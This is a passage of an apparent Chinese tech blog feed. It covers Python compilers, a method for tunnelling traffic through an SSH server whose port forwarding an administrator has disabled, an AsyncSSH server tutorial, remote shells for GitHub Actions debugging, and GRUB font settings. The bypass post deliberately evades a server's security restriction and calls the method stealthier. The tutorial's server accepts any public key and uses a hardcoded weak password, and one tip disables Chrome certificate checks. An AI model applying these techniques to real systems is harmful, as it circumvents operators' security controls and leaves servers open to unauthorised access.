<h2 id="0x04-结论"><a href="#0x04-结论" class="headerlink" title="0x04 结论"></a>0x04 结论</h2><p>相比于<code>py2exe</code>、<code>pyinstaller</code>等方案，Cython和Nuitka采用了先生成C代码，再进行编译的方案，相对来说安全性和性能上都优于前两种方案。</p>
<p>而Nuitka相比Cython，可以同时编译多个Python脚本，功能上更加强大一些，性能也提升了不少。不过Nuitka使用<code>--onefile</code>参数生成的可执行文件大小会远大于<code>pyinstaller</code>生成的文件大小。</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>cython</tag>
      </tags>
  </entry>
  <entry>
    <title>绕过SSH服务器的端口转发限制</title>
    <url>/2022/08/02/bypass-ssh-port-forward/</url>
    <content><![CDATA[<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>在某些场景下SSH服务器会禁用掉端口转发的能力，以降低安全风险。这会导致很多依赖SSH端口转发的工具无法正常工作。</p>
<p>这里主要是修改了<code>/etc/ssh/sshd_config</code>文件中以下几项实现的：</p>
<pre><code class="conf">#AllowAgentForwarding yes
#AllowTcpForwarding yes
#X11Forwarding yes
</code></pre>
<p>此时，SSH服务器基本就变成了只能执行shell命令的工具，无法用于建立通信通道。</p>
<p>是否有办法可以绕过这一限制呢？答案是肯定的。</p>
<h2 id="0x01-借尸还魂"><a href="#0x01-借尸还魂" class="headerlink" title="0x01 借尸还魂"></a>0x01 借尸还魂</h2><p>SSH最常用的能力就是交互式命令行，所谓交互式命令行，就是允许用户进行实时输入，并将输出实时展示出来。也就是说：<code>交互式命令行本身就是一个双向通信的通道</code>。因此，可以编写一个程序，它会在初始化时与指定的服务器端口建立Socket连接，然后将所有<code>stdin</code>读到的数据实时发送给Socket，并将Socket接收到的数据写到<code>stdout</code>中，<code>stderr</code>则用于输出控制信息和日志等。</p>
<p>根据上面的分析，这个程序其实跟<code>telnet</code>命令非常相似，但又不完全相同。因此用GO写了下面这个程序：</p>
<pre><code class="go">package main

import (
    &quot;bufio&quot;
    &quot;fmt&quot;
    &quot;net&quot;
    &quot;os&quot;
    &quot;os/signal&quot;
    &quot;strconv&quot;
    &quot;sync&quot;
    &quot;time&quot;
)

func telnet(host string, port int) int {
    conn, err := net.DialTimeout(&quot;tcp&quot;, fmt.Sprintf(&quot;%s:%d&quot;, host, port), 10*time.Second)
    if err != nil {
        fmt.Fprintln(os.Stderr, fmt.Sprintf(&quot;[FAIL] Connect %s:%d failed: %s&quot;, host, port, err))
        return -1
    }
    defer conn.Close()
    fmt.Fprintln(os.Stderr, &quot;[OKAY]&quot;)

    var wg sync.WaitGroup
    wg.Add(2)
    go handleWrite(conn, &amp;wg)
    go handleRead(conn, &amp;wg)
    wg.Wait()

    return 0
}

func handleRead(conn net.Conn, wg *sync.WaitGroup) int {
    defer wg.Add(-2)
    reader := bufio.NewReader(conn)
    buff := make([]byte, 4096)
    for {
        var bytes int
        var err error
        bytes, err = reader.Read(buff)
        if err != nil {
            fmt.Fprintln(os.Stderr, &quot;Error to read from upstream because of&quot;, err)
            return -1
        }

        _, err = os.Stdout.Write(buff[:bytes])
        if err != nil {
            fmt.Fprintln(os.Stderr, &quot;Error to write to stdout because of&quot;, err)
            return -1
        }
    }
}

func handleWrite(conn net.Conn, wg *sync.WaitGroup) int {
    defer wg.Add(-2)
    reader := bufio.NewReader(os.Stdin)
    buff := make([]byte, 4096)
    for {
        var bytes int
        var err error
        bytes, err = reader.Read(buff)
        if err != nil {
            fmt.Fprintln(os.Stderr, &quot;Error to read from stdin because of&quot;, err)
            return -1
        }

        _, err = conn.Write(buff[:bytes])
        if err != nil {
            fmt.Fprintln(os.Stderr, &quot;Error to write to upstream because of&quot;, err)
            return -1
        }
    }

}

func main() {
    if len(os.Args) &lt; 3 {
        fmt.Fprintln(os.Stderr, &quot;Usage: telnet host port&quot;)
        os.Exit(-1)
    }
    host := os.Args[1]
    port, _ := strconv.Atoi(os.Args[2])
    c := make(chan os.Signal, 1)
    signal.Notify(c, os.Interrupt)
    go func(){
        for sig := range c {
            // sig is a ^C, handle it
            fmt.Fprintln(os.Stderr, &quot;Signal&quot;, sig)
            os.Exit(0)
        }
    }()
    os.Exit(telnet(host, port))
}
</code></pre>
<p>完整的代码可以参考：<a href="https://github.com/turbo-tunnel/telnet-go" target="_blank" rel="noopener">telnet-go</a>。</p>
<h2 id="0x02-暗度陈仓"><a href="#0x02-暗度陈仓" class="headerlink" title="0x02 暗度陈仓"></a>0x02 暗度陈仓</h2><p>要使用telnet-go提供的通信通道，需要与<code>Paramiko</code>或<code>ASyncSSH</code>之类的SSH库进行集成才行。下面是使用<code>ASyncSSH</code>进行集成的核心逻辑：</p>
<pre><code class="python">class SSHProcessTunnel(SSHTunnel):
    &quot;&quot;&quot;SSH Tunnel Over Process StdIn and StdOut&quot;&quot;&quot;

    def __init__(self, tunnel, url, address):
        super(SSHProcessTunnel, self).__init__(tunnel, url, address)
        self._process = None

    @classmethod
    def has_cache(cls, url):
        return False

    async def _log_stderr(self):
        while not self.closed():
            error_line = await self._process.stderr.readline()
            error_line = error_line.strip()
            utils.logger.warn(
                &quot;[%s][stderr] %s&quot; % (self.__class__.__name__, error_line.decode())
            )
            await asyncio.sleep(0.5)
        self._process = None

    async def connect(self):
        ssh_conn = await self.create_ssh_conn()
        if not ssh_conn:
            return False
        bin_path = self._url.path
        cmdline = &quot;%s %s %d&quot; % (bin_path, self._addr, self._port)
        self._process = await ssh_conn.create_process(cmdline, encoding=None)
        await asyncio.sleep(0.5)

        if self._process.exit_status is not None and self._process.exit_status != 0:
            utils.logger.error(
                &quot;[%s] Create process %s failed: [%d]%s&quot;
                % (
                    self.__class__.__name__,
                    cmdline,
                    self._process.exit_status,
                    await self._process.stderr.read(),
                )
            )
            return False
        status_line = await self._process.stderr.readline()
        if status_line.startswith(b&quot;[OKAY]&quot;):
            utils.safe_ensure_future(self._log_stderr())
            return True
        elif status_line.startswith(b&quot;[FAIL]&quot;):
            utils.logger.warn(
                &quot;[%s] Connect %s:%d failed: %s&quot;
                % (
                    self.__class__.__name__,
                    self._addr,
                    self._port,
                    status_line.decode(),
                )
            )
            return False
        else:
            raise RuntimeError(&quot;Unexpected stderr: %s&quot; % status_line.decode())

    async def read(self):
        if self._process:
            buffer = await self._process.stdout.read(4096)
            if buffer:
                return buffer
        raise utils.TunnelClosedError()

    async def write(self, buffer):
        if self._process:
            return self._process.stdin.write(buffer)
        else:
            raise utils.TunnelClosedError()

    def closed(self):
        return self._process is None or self._process.exit_status is not None

    def close(self):
        if self._process:
            self._process.stdin.write(b&quot;\x03&quot;)
</code></pre>
<p>完整的代码可以参考：<a href="https://github.com/drunkdream/turbo-tunnel/blob/master/turbo_tunnel/ssh.py#L506" target="_blank" rel="noopener">turbo-tunnel</a>。</p>
<p>turbo-tunnel中可以使用以下方法将流量转发给SSH服务器：</p>
<pre><code class="bash">turbo-tunnel -l http://:8080/ -t ssh+process://root:password@1.1.1.1:2222/usr/local/bin/telnet
</code></pre>
<p><code>/usr/local/bin/telnet</code>是<code>telnet-go</code>在服务器上的路径，需要设置好可执行权限。</p>
<p>然后，本地通过<code>http://127.0.0.1:8080</code>代理访问的流量都会转发到ssh服务器上，从而实现了通过ssh服务器进行端口转发的目的。</p>
<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>利用进程的实时输入输出，可以解决SSH服务器不支持端口转发的问题，从而绕过服务器限制，建立通信通道。这种方式应用场景更广，也更加隐蔽，只是使用上需要提前将一个文件拷贝到SSH服务器上，这里可能少数场景会有些阻碍（例如删除了chmod命令），需要寻找绕过这些限制的方法。</p>
<p>不过总的来说，使用这种方法，大大提升了建立SSH隧道的成功率，具有较大的实际应用价值。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title>Chrome使用Fiddler抓HTTPS包</title>
    <url>/2017/01/07/chrome-fiddler-https/</url>
    <content><![CDATA[<p>Chrome从35之前的某一版本开始会检查HTTPS证书，如果不是信任的证书会阻止访问，报：  </p>
<blockquote>
<p>Failed to load resource: net::ERR_INSECURE_RESPONSE </p>
</blockquote>
<p>所以就没办法使用Fiddler抓HTTPS包了。</p>
<p>解决方式是启动Chrome的时候加上  </p>
<blockquote>
<p>–ignore-certificate-errors</p>
</blockquote>
<p>参数，这样Chrome就不会检查证书了。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>chrome</tag>
        <tag>fiddler</tag>
        <tag>https</tag>
      </tags>
  </entry>
  <entry>
    <title>创建一个简单的SSH服务器</title>
    <url>/2022/07/26/create-simple-ssh-server/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>为了加深对SSH协议的理解，准备自己实现一个SSH服务端，需要同时支持<code>Windows</code>、<code>Linux</code>、<code>MacOS</code>三大系统。为了尽量提升性能，准备使用<code>协程(asyncio)</code>来开发。</p>
<h2 id="0x01-基于AsyncSSH开发一个最简单的SSH服务端"><a href="#0x01-基于AsyncSSH开发一个最简单的SSH服务端" class="headerlink" title="0x01 基于AsyncSSH开发一个最简单的SSH服务端"></a>0x01 基于AsyncSSH开发一个最简单的SSH服务端</h2><p>在调研了几个开源的python SSH库后，最终选择了<a href="https://github.com/ronf/asyncssh" target="_blank" rel="noopener">AsyncSSH</a>。这个库基于asyncio开发，符合我们的要求，同时扩展性也比较好。</p>
<p>下面实现了一个使用固定账号密码登录的SSH服务器，登录成果后会打印一串字符串，并退出：</p>
<pre><code class="python">import asyncio
import asyncssh

async def start_ssh_server():
    def handle_client(process):
        process.stdout.write(&quot;Welcome to my SSH server, byebye!\n&quot;)
        process.exit(0)

    class MySSHServer(asyncssh.SSHServer):
        def __init__(self):
            self._conn = None

        def password_auth_supported(self):
            return True

        def validate_password(self, username, password):
            return username == &quot;drunkdream&quot; and password == &quot;123456&quot;

        def connection_made(self, conn):
            print(&quot;Connection created&quot;, conn.get_extra_info(&quot;peername&quot;)[0])
            self._conn = conn

        def connection_lost(self, exc):
            print(&quot;Connection lost&quot;, exc)

    await asyncssh.create_server(
        MySSHServer,
        &quot;&quot;,
        2222,
        server_host_keys=[&quot;skey&quot;],
        process_factory=handle_client,
    )

    await asyncio.sleep(1000)

loop = asyncio.get_event_loop()
loop.run_until_complete(start_ssh_server())
</code></pre>
<p><code>server_host_keys</code>是服务端的私钥文件列表，用于在建立连接时验证服务端的合法性；在第一次连接时客户端会弹出验证指纹的提示，选择<code>yes</code>后会将指纹保存到本地，下次连接时会验证指纹是否匹配，不匹配会报错。</p>
<pre><code>The authenticity of host &#39;[127.0.0.1]:2222 ([127.0.0.1]:2222)&#39; can&#39;t be established.
RSA key fingerprint is SHA256:nyXXvfYgedKWPRnhl1ss6k+R5cqFleUQu/fDhYYXESI.
Are you sure you want to continue connecting (yes/no)?
</code></pre><pre><code class="bash">ssh drunkdream@127.0.0.1 -p 2222
Password:
Welcome to my SSH server, byebye!
Connection to 127.0.0.1 closed.
</code></pre>
<p>这样就实现了一个最简单的SSH服务器了，由此可见，使用<code>AsyncSSH</code>开发SSH服务端是非常方便的。</p>
<h2 id="0x02-支持Shell命令"><a href="#0x02-支持Shell命令" class="headerlink" title="0x02 支持Shell命令"></a>0x02 支持Shell命令</h2><p>SSH最常用的功能就是远程终端（shell），下面来实现一个支持执行命令的SSH服务：</p>
<pre><code class="python">async def start_ssh_server():
    import asyncssh

    async def handle_client(process):
        proc = await asyncio.create_subprocess_shell(
            process.command or &quot;bash -i&quot;,
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            close_fds=True,
        )
        stdin = proc.stdin
        stdout = proc.stdout
        stderr = proc.stderr

        tasks = [None, None, None]

        while proc.returncode is None:
            if tasks[0] is None:
                tasks[0] = asyncio.ensure_future(process.stdin.read(4096))
            if tasks[1] is None:
                tasks[1] = asyncio.ensure_future(stdout.read(4096))
            if tasks[2] is None:
                tasks[2] = asyncio.ensure_future(stderr.read(4096))

            done_tasks, _ = await asyncio.wait(
                tasks, return_when=asyncio.FIRST_COMPLETED
            )

            for task in done_tasks:
                index = tasks.index(task)
                assert index &gt;= 0
                tasks[index] = None
                buffer = task.result()
                if not buffer:
                    return -1

                if index == 0:
                    stdin.write(buffer)
                elif index == 1:
                    process.stdout.write(buffer.replace(b&quot;\n&quot;, b&quot;\r\n&quot;))
                else:
                    process.stderr.write(buffer.replace(b&quot;\n&quot;, b&quot;\r\n&quot;))
        return proc.returncode

    class MySSHServer(asyncssh.SSHServer):
        def __init__(self):
            self._conn = None

        def password_auth_supported(self):
            return True

        def validate_password(self, username, password):
            return username == &quot;drunkdream&quot; and password == &quot;123456&quot;

        def connection_made(self, conn):
            print(&quot;Connection created&quot;, conn.get_extra_info(&quot;peername&quot;)[0])
            self._conn = conn

        def connection_lost(self, exc):
            print(&quot;Connection lost&quot;, exc)

    await asyncssh.create_server(
        MySSHServer,
        &quot;&quot;,
        2222,
        server_host_keys=[&quot;skey&quot;],
        process_factory=lambda process: asyncio.ensure_future(handle_client(process)),
        encoding=None,
        line_editor=False
    )

    await asyncio.sleep(1000)
</code></pre>
<p>与前一个版本相比，主要是修改了<code>handle_client</code>实现，变成了一个协程函数，里面创建了子进程，并支持将ssh客户端输入的命令传给子进程，然后将子进程的stdout和stderr转发给ssh客户端。注意到，这里将<code>line_editor</code>参数设置成了<code>False</code>，主要是为了支持实时命令交互。这个参数后面还会详细介绍。</p>
<p>上面的代码在实际使用中发现，对于很快执行完的命令，如：<code>ifconfig</code>等，使用上没什么问题，但是如果输入<code>python</code>命令进入交互式界面，就会卡住没有任务输入。这是因为使用<code>create_subprocess_shell</code>方式创建的子进程不支持<code>pty</code>导致的。</p>
<h2 id="0x03-支持pty"><a href="#0x03-支持pty" class="headerlink" title="0x03 支持pty"></a>0x03 支持pty</h2><p><code>pty(pseudo-tty)</code>是伪终端的意思，也就是虚拟了一个终端出来，让进程可以像正常终端一样进行交互（通常情况下通过管道重定向输入输出的进程都无法支持交互式操作）。交互式终端下缓冲模式是<code>无缓冲</code>（字符模式），也就是stdout每次只要有输出就会打印出来；而非交互式终端是<code>行缓冲</code>模式，stdout必须收到<code>\n</code>换行符才会打印出来。</p>
<p>也就是说，如果终端要支持像python交互式命令这样的场景，必须支持<code>pty</code>。python中可以通过<code>sys.stdout.isatty()</code>来判断当前进程是否支持伪终端。</p>
<pre><code class="bash">python -c &#39;import sys;print(sys.stdout.isatty())&#39;
True

python -c &#39;import sys;print(sys.stdout.isatty())&#39; &gt; /tmp/1.txt &amp;&amp; cat /tmp/1.txt
False

python -c &#39;import pty; pty.spawn([&quot;python&quot;, &quot;-c&quot;, &quot;import sys;print(sys.stdout.isatty())&quot;])&#39; &gt; /tmp/1.txt &amp;&amp; cat /tmp/1.txt
True
</code></pre>
<p>从上面可以看出，经过重定向之后，<code>isatty</code>返回值变成了<code>False</code>；但是使用<code>pty.spawn</code>函数之后，重定向就不会影响<code>isatty</code>的返回值了。这里的秘密就在于<code>pty</code>库实现了一个虚拟的tty，具体实现原理我们后面有时间再来分析。</p>
<p>因此，可以使用以下代码创建一个支持pty的子进程：</p>
<pre><code class="python">import pty

cmdline = list(shlex.split(command or os.environ.get(&quot;SHELL&quot;, &quot;sh&quot;)))
exe = cmdline[0]
if exe[0] != &quot;/&quot;:
    for it in os.environ[&quot;PATH&quot;].split(&quot;:&quot;):
        path = os.path.join(it, exe)
        if os.path.isfile(path):
            exe = path
            break

pid, fd = pty.fork()
if pid == 0:
    # child process
    sys.stdout.flush()
    try:
        os.execve(exe, cmdline, os.environ)
    except Exception as e:
        sys.stderr.write(str(e))
else:
    # parent process
    print(os.read(fd, 4096))
</code></pre>
<p>上面的方法只能支持Linux和MacOS系统，Windows 1809以上版本可以使用以下方法：</p>
<pre><code class="python">cmd = (
    &quot;conhost.exe&quot;,
    &quot;--headless&quot;,
    &quot;--width&quot;,
    str(size[0]),
    &quot;--height&quot;,
    str(size[1]),
    &quot;--&quot;,
    command or &quot;cmd.exe&quot;,
)
proc = await asyncio.create_subprocess_exec(
    *cmd,
    stdin=asyncio.subprocess.PIPE,
    stdout=asyncio.subprocess.PIPE,
    stderr=asyncio.subprocess.PIPE,
)
</code></pre>
<p><code>conhost.exe</code>里使用<code>CreatePseudoConsole</code>等相关函数，实现了伪终端。低版本Windows上就需要使用其它方式来支持了，例如：<a href="https://github.com/rprichard/winpty" target="_blank" rel="noopener">winpty</a>。</p>
<h2 id="0x04-行编辑器模式"><a href="#0x04-行编辑器模式" class="headerlink" title="0x04 行编辑器模式"></a>0x04 行编辑器模式</h2><p>前面提到，在使用<code>asyncssh.create_server</code>函数创建SSH服务端时，有个<code>line_editor</code>参数设置成了<code>False</code>。这表示关闭了行编辑器模式，也就是说任何输入的字符都会被实时发送给shell进程，一般这种都是shell进程拥有伪终端的情况。</p>
<p>但如果创建的是一个不支持伪终端的shell进程，就必须关闭行编辑器模式，也就是将<code>line_editor</code>置为<code>True</code>。此时，SSH客户端输入的字符会被asyncssh库捕获并进行处理，直到用户按下<code>Enter</code>键的时候，才会将输入一次性发送给shell进程。</p>
<p>具体可以参考<a href="https://asyncssh.readthedocs.io/en/latest/#line-editing" target="_blank" rel="noopener">文档</a>。</p>
<h2 id="0x05-支持端口转发"><a href="#0x05-支持端口转发" class="headerlink" title="0x05 支持端口转发"></a>0x05 支持端口转发</h2><p>SSH服务器有个非常有用的功能就是端口转发，包括正向端口转发和反向端口转发。使用方法如下：</p>
<p>正向端口转发：</p>
<pre><code class="bash">ssh -L 127.0.0.1:7778:127.0.0.1:7777 root@1.2.3.4
</code></pre>
<p>此时，可以将远程机器上的7777端口映射到本地的7778端口。</p>
<p>反向端口转发：</p>
<pre><code class="bash">ssh -R 127.0.0.1:7778:127.0.0.1:7777 root@1.2.3.4
</code></pre>
<p>此时，可以将本地的7777端口映射到远程机器上的7778端口。</p>
<p>要支持端口转发，只需要<code>MySSHServer</code>类增加<code>connection_requested</code>和<code>server_requested</code>方法即可。</p>
<pre><code class="python">    async def connection_requested(self, dest_host, dest_port, orig_host, orig_port):
        # 正向端口转发
        return await self._conn.forward_connection(dest_host, dest_port)

    def server_requested(self, listen_host, listen_port):
        # 反向端口转发
        return True
</code></pre>
<h2 id="0x06-支持密钥登录"><a href="#0x06-支持密钥登录" class="headerlink" title="0x06 支持密钥登录"></a>0x06 支持密钥登录</h2><p>通常我们登录SSH服务器，更多的是使用密钥方式登录。要开启这个特性只需要增加以下两个方法即可：</p>
<pre><code class="python">    def public_key_auth_supported(self):
        return True

    def validate_public_key(self, username, key):
        return True
</code></pre>
<h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>使用AsyncSSH库开发SSH服务器还是比较简单的，很多特性都已经封装好了，只要重写一下对应的方法，返回True就可以了。同时，它也提供了高级可定制化的能力，以便实现较为复杂的功能。</p>
<p>完整的SSH服务器代码可以参考：<a href="https://github.com/drunkdream/turbo-tunnel/blob/master/turbo_tunnel/ssh.py#L24" target="_blank" rel="noopener">https://github.com/drunkdream/turbo-tunnel/blob/master/turbo_tunnel/ssh.py#L24</a>。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>ssh</tag>
        <tag>python</tag>
        <tag>asyncio</tag>
      </tags>
  </entry>
  <entry>
    <title>在线调试Github Actions</title>
    <url>/2022/06/27/debug-github-actions/</url>
    <content><![CDATA[<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>Github Action提供了便捷的流水线能力，但是对于较为复杂的场景，只能依靠不断试错来定位和解决Action报错，效率非常低下。网上也有人提供了基于<code>tmate</code>的远程调试方案，但该方案也存在着一些不足。本文尝试提供一些其它的解决方案。</p>
<h2 id="0x01-tmate方案简述"><a href="#0x01-tmate方案简述" class="headerlink" title="0x01 tmate方案简述"></a>0x01 tmate方案简述</h2><p><a href="https://tmate.io/" target="_blank" rel="noopener">tmate</a>是一款实时终端共享工具，主要支持Linux系统。其基本原理是：tmate运行后会创建一个shell会话，并连接到服务端，然后展示一个ssh地址；访问端使用ssh工具访问这个地址，获取tmate创建的shell。</p>
<p>基本使用方法如下：</p>
<ul>
<li>共享端</li>
</ul>
<p>先保证<code>~/.ssh</code>目录下存在<code>rsa_id</code>文件，如果不存在可以使用<code>ssh-keygen -t rsa</code>命令生成。</p>
<pre><code class="bash">$ tmate
</code></pre>
<p>此时，底部会提示访问端使用的ssh地址，如：<a href="mailto:`qsMzYcuPFTFYzKvXa6cgggDyc@lon1.tmate.io" target="_blank" rel="noopener">`qsMzYcuPFTFYzKvXa6cgggDyc@lon1.tmate.io</a>`。</p>
<ul>
<li>访问端</li>
</ul>
<pre><code class="bash">$ ssh qsMzYcuPFTFYzKvXa6cgggDyc@lon1.tmate.io
</code></pre>
<p>连上后，共享端和访问端访问的是同一个<code>shell</code>，任何一方的操作都会同步到对方终端中；而且任何一方退出也会导致对方shell退出。</p>
<p>因此，tmate方案的优缺点总结如下：</p>
<ul>
<li>优点<ul>
<li>无需第三方服务支持</li>
<li>访问端无需安装额外的工具</li>
</ul>
</li>
<li>缺点<ul>
<li>不支持Windows</li>
<li>连接断开后无法重新连接</li>
</ul>
</li>
</ul>
<p>已经有人将tmate封装到了Github Action中，具体使用方法可以参考：<a href="https://github.com/marketplace/actions/debugging-with-tmate" target="_blank" rel="noopener">https://github.com/marketplace/actions/debugging-with-tmate</a>。</p>
<h2 id="0x02-使用pytmate代替tmate"><a href="#0x02-使用pytmate代替tmate" class="headerlink" title="0x02 使用pytmate代替tmate"></a>0x02 使用pytmate代替tmate</h2><p><a href="https://github.com/drunkdream/pytmate" target="_blank" rel="noopener">pytmate</a>是用纯python实现的tmate，不仅提供了终端分享的能力，还增加了对Windows系统的支持以及断开ssh后不会自动退出分享端shell的逻辑。</p>
<p>因此，pytmate可以解决tmate存在的上述两个问题。</p>
<p>使用方法如下：</p>
<pre><code class="bash">$ python3 -m pip install tmate
$ tmate
[TMateClient] Connect SSH server ssh.tmate.io:22...
[Notify] web session read only: https://tmate.io/t/ro-mfZVpKgGUKAtmLuFsyyhK92af
[Notify] ssh session read only: ssh ro-mfZVpKgGUKAtmLuFsyyhK92af@sgp1.tmate.io
[Notify] web session: https://tmate.io/t/bJT5pQpYEcBHjXnxZR6Uxw25G
[Notify] ssh session: ssh bJT5pQpYEcBHjXnxZR6Uxw25G@sgp1.tmate.io
</code></pre>
<p>目前对Win10 1809以上系统版本支持较好，因为系统支持了<code>pty</code>；对于低版本Win10以及Win7系统，可以执行不需要交互式执行的命令，交互式命令由于无法实时输出，看起来像是卡住了一样。</p>
<p>在Github Action中使用pytmate可以参考：<a href="https://github.com/drunkdream/pytmate/blob/master/README.md#%E5%9C%A8%E7%BA%BF%E8%B0%83%E8%AF%95github-actions" target="_blank" rel="noopener">https://github.com/drunkdream/pytmate/blob/master/README.md#%E5%9C%A8%E7%BA%BF%E8%B0%83%E8%AF%95github-actions</a>。</p>
<h2 id="0x03-使用wsterm-frp"><a href="#0x03-使用wsterm-frp" class="headerlink" title="0x03 使用wsterm + frp"></a>0x03 使用wsterm + frp</h2><p><a href="https://github.com/wsterm/wsterm" target="_blank" rel="noopener">wsterm</a>是用纯Python实现的一款基于<code>WebSocket</code>的终端Shell工具，其本身目标是为了提供一个易于跨网络访问的远程调试终端工具，支持自动将本地的工作区文件/目录同步到远程机器上。</p>
<p>虽然wsterm不支持<code>反向连接</code>，无法在外部直接访问Github Action中的wsterm服务端，但可以通过借助于<code>frp</code>之类的工具，将内部端口暴露到外网中，然后wsterm客户端直接去连接这个外网地址即可。wsterm本身提供了基于<code>token</code>的权限校验机制，可以在一定程度上保证服务端的安全性。</p>
<p>使用wsterm最大的优势是工作区自动同步能力，可以方便地进行本地修改，远程执行，极大降低了远程调试代码的成本；也不会因为终端意外退出导致修改没有同步到本地的问题。</p>
<p>目前网上有提供一些免费或收费的<code>frp</code>服务端，可以通过这些服务进行wsterm端口的映射；也可以使用自己的服务器搭建frp服务。</p>
<p>具体使用方法可以参考：<a href="https://github.com/wsterm/wsterm/blob/master/.github/workflows/debug-linux.yml" target="_blank" rel="noopener">https://github.com/wsterm/wsterm/blob/master/.github/workflows/debug-linux.yml</a>。</p>
<p>这里启动Action是通过在Github issue中发送特定字符串（如：<code>Debug Linux</code>）的方式，Action启动后会将访问地址回复到issue中；<code>frp</code>使用的则是<code>freefrp.net</code>提供的免费服务。</p>
<p>wsterm也提供了一个<a href="https://github.com/wsterm/wsterm/issues/19" target="_blank" rel="noopener">issue页面</a>，可以用于进行在线调试。</p>
<p><img src="/images/github-action-linux.png" alt></p>
<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>在线调试Github Action主要是两种思路：</p>
<ul>
<li>利用第三方终端分享服务（如：tmate等）将内网机器上的Shell暴露出来</li>
<li>结合远程Shell工具（如：ssh、wsterm等）和内网端口映射工具（如：frp等）将Shell暴露出来</li>
</ul>
<p>第一种思路实现相对会简单一些，但功能会受到第三方服务的限制，扩展性不好；第二种思路虽然实现会复杂一些，但扩展性较好，可以根据实际需求使用不同的组合。</p>
]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title>解决Deepin中Grub字体太小问题</title>
    <url>/2022/11/05/deepin-modify-grub-font-size/</url>
    <content><![CDATA[<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>最近重装了一下Deepin v20系统，发现开机时Grub菜单字体变小了，看着很不舒服，就尝试着寻找了下解决方法。</p>
<p>Grub配置文件路径是：<code>/etc/default/grub</code>，所以主要就是修改这个文件。该文件的默认内容为：</p>
<pre><code class="ini"># Written by com.deepin.daemon.Grub2
DEEPIN_GFXMODE_ADJUSTED=1
GRUB_BACKGROUND=/boot/grub/themes/deepin-fallback/background.jpg
GRUB_CMDLINE_LINUX_DEFAULT=&quot;splash quiet&quot;
GRUB_DEFAULT=0
GRUB_DISTRIBUTOR=&quot;`/usr/bin/lsb_release -d -s 2&gt;/dev/null || echo UOS 20`&quot;
GRUB_GFXMODE=3840x2160,1920x1080,1024x768,auto
GRUB_THEME=/boot/grub/themes/deepin-fallback/theme.txt
GRUB_TIMEOUT=5
</code></pre>
<p>修改这个文件后，使用<code>update-grub</code>命令更新Grub配置，然后重启电脑。</p>
<h2 id="0x01-修改GRUB-GFXMODE配置"><a href="#0x01-修改GRUB-GFXMODE配置" class="headerlink" title="0x01 修改GRUB_GFXMODE配置"></a>0x01 修改GRUB_GFXMODE配置</h2><p>网上找到的比较多的解决方法是修改<code>GRUB_GFXMODE</code>配置，也就是修改Grub使用的分辨率：<code>GRUB_GFXMODE=1024x768</code>，从而让字变大。不过在我电脑上，只有<code>1024x768</code>这个分辨率能够生效，而且看起来字不仅偏大，背景图片也变模糊了。所以这种方法不算是特别好的解决方法。</p>
<h2 id="0x02-增加GRUB-FONT配置"><a href="#0x02-增加GRUB-FONT配置" class="headerlink" title="0x02 增加GRUB_FONT配置"></a>0x02 增加GRUB_FONT配置</h2><p>网上另一种解决方案是先通过<code>grub2-mkfont</code>命令生成较大一些的字体，然后修改<code>GRUB_FONT</code>配置，指向生成的字体文件路径。具体方法如下：</p>
<pre><code class="bash">$ sudo grub-mkfont --output=/boot/grub/fonts/DejaVuSansMono36.pf2 --size=36 /usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf
</code></pre>
<p>然后增加配置：<code>GRUB_FONT=/boot/grub/fonts/DejaVuSansMono36.pf2</code>。</p>
<p>不过这种方法也没有生效。后来发现是因为当<code>GRUB_FONT</code>与<code>GRUB_THEME</code>同时存在时，会优先使用<code>GRUB_THEME</code>中的配置。</p>
<h2 id="0x03-修改主题文件"><a href="#0x03-修改主题文件" class="headerlink" title="0x03 修改主题文件"></a>0x03 修改主题文件</h2><p>Deepin中默认使用的Grub主题文件路径是：<code>/boot/grub/themes/deepin-fallback/theme.txt</code>。该文件文件如下：</p>
<pre><code class="ini">#version:17
#lang:zh_CN.UTF-8
#themeInputDir:/usr/share/dde-api/data/grub-themes/deepin-fallback
#head end
title-text: &quot;&quot;
desktop-image: &quot;background.jpg&quot;
desktop-color: &quot;#000000&quot;
terminal-font: &quot;Unifont Regular 16&quot;
terminal-box: &quot;terminal_box_*.png&quot;
terminal-left: &quot;0&quot;
terminal-top: &quot;0&quot;
terminal-width: &quot;100%&quot;
terminal-height: &quot;100%&quot;
terminal-border: &quot;0&quot;
+ boot_menu {
    left = 15%
    top = 20%
    width = 70%
    height = 60%
    item_font = &quot;Unifont Regular 16&quot;
    item_color = &quot;#cccccc&quot;
    selected_item_color = &quot;#0099ff&quot;
    item_height = 24
    item_spacing = 12
    selected_item_pixmap_style = &quot;select_*.png&quot;
    scrollbar_thumb = &quot;scrollbar_thumb_*.png&quot;
    scrollbar_width = 6
    menu_pixmap_style = &quot;menu_*.png&quot;
}
+ label {
    left = 0
    top = 97%
    width = 100%
    align = &quot;center&quot;
    id = &quot;__timeout__&quot;
    color = &quot;#99E53E&quot;
    font = &quot;Unifont Regular 16&quot;
    text = &quot;在 %d 秒内启动&quot;
}
+ label {
    left = 0
    top = 94%
    width = 100%
    align = &quot;center&quot;
    color = &quot;#99E53E&quot;
    font = &quot;Unifont Regular 16&quot;
    text = &quot;使用 ↑ 和 ↓ 键移动选择条，Enter 键确认，E 键编辑启动命令，C 键进入命令行&quot;
}
